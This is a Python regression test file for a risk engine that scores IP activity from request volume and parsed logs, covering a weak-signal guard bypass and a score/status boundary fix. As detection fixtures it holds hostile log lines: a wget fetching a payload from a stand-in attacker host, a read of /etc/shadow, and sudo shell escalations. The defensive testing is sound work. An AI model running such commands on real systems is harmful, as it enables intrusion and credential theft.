"""
Regression tests for: weak-signal baseline guard bypass in risk_engine.py,
plus the follow-up score/status boundary fix.

Bug 1: the clean-baseline guard only protected events with ZERO log signals
(or safe-sudo-only activity). A single incidental failed login (failed==1,
nothing else) satisfied neither condition, so it fell through to the
ordinary weighted-sum + override cascade — where the spike override could
unconditionally floor a legitimate volume burst to EXTREME_RISK (>=60) or
HIGH_RISK (>=40), defeating the carefully-calibrated ML_ANOMALY_THRESHOLD
this same guard exists to respect for pure-volume events.

Fix 1: generalized the guard to a weak-vs-strong evidence policy. An event is
routed into the (ML-threshold-gated, capped) baseline path unless it has a
STRONG signal: suspicious_commands>=1, sensitive_file_accesses>=1,
privilege_escalations>=1, or failed_logins>=2 — i.e. exactly the thresholds
each signal's own floor already fires at. A single failed login (alone or
with sudo) no longer escapes the guard.

Bug 2 (follow-up): the capped weak-evidence-below-threshold branch hardcoded
status="NORMAL" after capping risk_score at 20.0 — but _classify(20.0) is
SUSPICIOUS (its score>=20 check is inclusive), so status and score disagreed
at that exact boundary, which any real volume burst reaches (spike+count
alone push the pre-cap weighted sum well past 20).

Fix 2: cap the ceiling at 19.99, not 20.0, and derive status via
_classify(final) like every other return path — no more hardcoded exception.
19.99 keeps the capped score strictly inside the NORMAL band by
construction, so the two can never disagree.

Deterministic, isolated unit tests — no live server, no trained model
artifact, no wall-clock/randomness dependence: get_ml_score is mocked to a
controlled value per scenario, and each scenario resets all per-IP state and
uses its own IP so scenarios cannot contaminate each other.

Run with:
    python test_risk_engine_weak_signal_policy.py   (from repo root)
"""
import sys
from datetime import datetime, timezone
from unittest.mock import patch

if sys.stdout.encoding and sys.stdout.encoding.lower() != "utf-8":
    sys.stdout.reconfigure(encoding="utf-8")

from ingestion.services import log_parser, ip_memory, risk_engine
from ingestion.services.risk_engine import ML_ANOMALY_THRESHOLD, _classify

FAILURES = []
NOW = datetime.now(timezone.utc)
ALL_RESULTS = []  # (label, result) — for the blanket status/_classify consistency pass at the end


def check(label, condition, detail=""):
    status = "PASS" if condition else "FAIL"
    print(f"[{status}] {label}" + (f" -- {detail}" if detail and not condition else ""))
    if not condition:
        FAILURES.append(label)


def record(label, result):
    ALL_RESULTS.append((label, result))
    return result


def reset_all():
    """Full isolation between scenarios: no shared per-IP history, log
    counters, or rate windows can leak from one test into the next."""
    log_parser.reset_state()
    ip_memory.reset_state()
    risk_engine.reset_state()


def burst(ip, ml_score, sudo_lines=None, failed_lines=None, request_counts=None):
    """
    Build a low-and-steady history for `ip`, then one large volume burst
    (the classic "legitimate traffic spike" shape: sale, batch job), with
    get_ml_score mocked to a controlled, deterministic value throughout.
    Returns the compute_risk() result for the burst event itself.
    """
    for line in (failed_lines or []):
        log_parser.ingest_logs_for_ip(ip, [line])
    for line in (sudo_lines or []):
        log_parser.ingest_logs_for_ip(ip, [line])

    with patch("ingestion.services.risk_engine.get_ml_score", return_value=ml_score):
        for c in (request_counts or [20, 22, 19, 21]):
            risk_engine.compute_risk(ip, request_count=c, timestamp=NOW)
        # The burst itself — large jump relative to the steady history above.
        result = risk_engine.compute_risk(ip, request_count=2000, timestamp=NOW)
    return result


# ── 1. Baseline: legitimate burst, zero log signals → stays protected, score < 20 ──
reset_all()
r = record("zero-signal burst", burst("10.1.0.1", ml_score=10.0))
check("zero-signal burst -> NORMAL", r["status"] == "NORMAL", f"got {r['status']}/{r['risk_score']}")
check("zero-signal burst -> score strictly < 20 (not ==20)", r["risk_score"] < 20.0, f"got {r['risk_score']}")

# ── 2. Single incidental failure: same burst, exactly 1 failed login, score < 20 ──
reset_all()
r = record("1 failed login + burst", burst(
    "10.1.0.2", ml_score=10.0,
    failed_lines=["Jan 1 00:00:00 web01 sshd: Failed password for bob from 10.1.0.2 port 22 ssh2"],
))
check(
    "1 failed login + burst -> NORMAL (not HIGH_RISK/EXTREME_RISK)",
    r["status"] == "NORMAL",
    f"got {r['status']}/{r['risk_score']}",
)
check("1 failed login + burst -> score strictly < 20 (not ==20)", r["risk_score"] < 20.0, f"got {r['risk_score']}")
check("1 failed login + burst -> spike was in fact extreme (sanity check)", r["components"]["spike_score"] >= 90.0)

# Same, but with a failed SUDO password specifically (the originally reported
# log line shape) -- sudo_attempts and failed_logins both increment, must
# still count as weak alone.
reset_all()
r = record("1 failed sudo password + burst", burst(
    "10.1.0.3", ml_score=10.0,
    failed_lines=["sudo: admin : 1 incorrect password attempt from 10.1.0.3"],
))
check(
    "1 failed sudo password + burst -> NORMAL, score strictly < 20",
    r["status"] == "NORMAL" and r["risk_score"] < 20.0,
    f"got {r['status']}/{r['risk_score']}",
)

# ── 3. Weak signal cannot reach SUSPICIOUS through rounding at the boundary ─────
# Drive the pre-cap weighted sum as close to 20 as this path can get (a big
# spike plus a middling ml_score, both well within "weak evidence" since
# there is still no strong log signal) and confirm the capped result still
# lands strictly below 20 and classifies NORMAL, never SUSPICIOUS.
reset_all()
r = record("weak signal, ml just below threshold, pushed near the cap", burst(
    "10.1.0.14", ml_score=ML_ANOMALY_THRESHOLD - 0.01,  # as close to the elevation path as possible without crossing it
))
check(
    "weak signal near the ML threshold boundary -> still NORMAL, score < 20",
    r["status"] == "NORMAL" and r["risk_score"] < 20.0,
    f"got {r['status']}/{r['risk_score']}",
)

# ── 4. Repeated failures: 2 failed logins -> intended SUSPICIOUS policy ────────
reset_all()
ip = "10.1.0.4"
with patch("ingestion.services.risk_engine.get_ml_score", return_value=10.0):
    for _ in range(2):
        log_parser.ingest_logs_for_ip(ip, [f"sudo: admin : 1 incorrect password attempt from {ip}"])
    r = record("2 failed logins", risk_engine.compute_risk(ip, request_count=1, timestamp=NOW))
check(
    "2 failed logins (low volume) -> SUSPICIOUS",
    r["status"] == "SUSPICIOUS" and r["risk_score"] >= 20.0,
    f"got {r['status']}/{r['risk_score']}",
)

# ── 5. Brute force floors: 5+ -> HIGH_RISK, 8+ -> EXTREME_RISK ──────────────────
reset_all()
ip = "10.1.0.5"
with patch("ingestion.services.risk_engine.get_ml_score", return_value=10.0):
    for _ in range(5):
        log_parser.ingest_logs_for_ip(ip, [f"sudo: admin : 1 incorrect password attempt from {ip}"])
    r = record("5 failed logins", risk_engine.compute_risk(ip, request_count=1, timestamp=NOW))
check("5 failed logins -> HIGH_RISK floor (score>=35)", r["status"] == "HIGH_RISK" and r["risk_score"] >= 35.0,
      f"got {r['status']}/{r['risk_score']}")

reset_all()
ip = "10.1.0.6"
with patch("ingestion.services.risk_engine.get_ml_score", return_value=10.0):
    for _ in range(8):
        log_parser.ingest_logs_for_ip(ip, [f"sudo: admin : 1 incorrect password attempt from {ip}"])
    r = record("8 failed logins", risk_engine.compute_risk(ip, request_count=1, timestamp=NOW))
check("8 failed logins -> EXTREME_RISK floor (score>=70)", r["status"] == "EXTREME_RISK" and r["risk_score"] >= 70.0,
      f"got {r['status']}/{r['risk_score']}")

# ── 6. Strong single-occurrence signals still floor immediately ────────────────
reset_all()
ip = "10.1.0.7"
log_parser.ingest_logs_for_ip(ip, ["Jan 1 00:00:00 web01: wget http://evil.example/payload.sh"])
with patch("ingestion.services.risk_engine.get_ml_score", return_value=10.0):
    r = record("1 suspicious command", risk_engine.compute_risk(ip, request_count=1, timestamp=NOW))
check("1 suspicious command -> HIGH_RISK floor (score>=35)", r["status"] == "HIGH_RISK" and r["risk_score"] >= 35.0,
      f"got {r['status']}/{r['risk_score']}")

reset_all()
ip = "10.1.0.8"
log_parser.ingest_logs_for_ip(ip, ["Jan 1 00:00:00 web01: cat /etc/shadow"])
with patch("ingestion.services.risk_engine.get_ml_score", return_value=10.0):
    r = record("1 sensitive-file access", risk_engine.compute_risk(ip, request_count=1, timestamp=NOW))
check("1 sensitive-file access -> HIGH_RISK floor (score>=35)", r["status"] == "HIGH_RISK" and r["risk_score"] >= 35.0,
      f"got {r['status']}/{r['risk_score']}")

reset_all()
ip = "10.1.0.9"
log_parser.ingest_logs_for_ip(ip, [
    "Jan 1 00:00:00 web01 sudo: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash"
])
with patch("ingestion.services.risk_engine.get_ml_score", return_value=10.0):
    r = record("1 privilege-escalation event", risk_engine.compute_risk(ip, request_count=1, timestamp=NOW))
check("1 privilege-escalation event -> HIGH_RISK floor (score>=45)", r["status"] == "HIGH_RISK" and r["risk_score"] >= 45.0,
      f"got {r['status']}/{r['risk_score']}")

reset_all()
ip = "10.1.0.10"
log_parser.ingest_logs_for_ip(ip, [
    "Jan 1 00:00:00 web01 sudo: deploy : COMMAND=/bin/bash",
    "Jan 1 00:00:01 web01 sudo: deploy : COMMAND=/bin/sh",
    "Jan 1 00:00:02 web01 sudo: deploy : COMMAND=/usr/bin/bash",
])
with patch("ingestion.services.risk_engine.get_ml_score", return_value=10.0):
    r = record("3 privilege-escalation events", risk_engine.compute_risk(ip, request_count=1, timestamp=NOW))
check("3 privilege-escalation events -> EXTREME_RISK floor (score>=65)",
      r["status"] == "EXTREME_RISK" and r["risk_score"] >= 65.0, f"got {r['status']}/{r['risk_score']}")

# ── 7. Multi-stage attack: failed + suspicious + sudo -> EXTREME_RISK ──────────
reset_all()
ip = "10.1.0.11"
log_parser.ingest_logs_for_ip(ip, [
    "Jan 1 00:00:00 web01 sshd: Failed password for root from 10.1.0.11 port 22 ssh2",
    "Jan 1 00:00:01 web01: wget http://evil.example/payload.sh",
    "Jan 1 00:00:02 web01 sudo: deploy : COMMAND=/usr/bin/id",
])
with patch("ingestion.services.risk_engine.get_ml_score", return_value=10.0):
    r = record("multi-stage attack", risk_engine.compute_risk(ip, request_count=1, timestamp=NOW))
check("multi-stage (failed+suspicious+sudo) -> EXTREME_RISK (score>=70)",
      r["status"] == "EXTREME_RISK" and r["risk_score"] >= 70.0, f"got {r['status']}/{r['risk_score']}")

# ── 8. Volume-only anomaly: genuine extreme volume, zero log signals, ML says anomaly ──
reset_all()
r = record("volume-only anomaly, ml>=threshold", burst("10.1.0.12", ml_score=ML_ANOMALY_THRESHOLD + 5.0))
check(
    "volume-only anomaly (ml>=threshold, no logs) -> elevated but capped below EXTREME",
    20.0 <= r["risk_score"] <= 59.0 and r["status"] in ("SUSPICIOUS", "HIGH_RISK"),
    f"got {r['status']}/{r['risk_score']}",
)
check("volume-only anomaly -> override_triggered=True", r["override_triggered"] is True)

# Below the threshold -> must stay NORMAL, strictly below 20.
reset_all()
r2 = record("volume-only, ml below threshold", burst("10.1.0.13", ml_score=ML_ANOMALY_THRESHOLD - 5.0))
check(
    "volume-only, ml below threshold -> NORMAL, score strictly < 20",
    r2["status"] == "NORMAL" and r2["risk_score"] < 20.0,
    f"got {r2['status']}/{r2['risk_score']}",
)

# ── 9. Blanket invariant: every result's status must agree with _classify(score) ──
for label, result in ALL_RESULTS:
    check(
        f"status == _classify(risk_score) for [{label}] (score={result['risk_score']}, status={result['status']})",
        result["status"] == _classify(result["risk_score"]),
    )

print()
if FAILURES:
    print(f"{len(FAILURES)} check(s) failed: {FAILURES}")
    sys.exit(1)
print(f"All checks passed. ({len(ALL_RESULTS)} results verified consistent with _classify())")
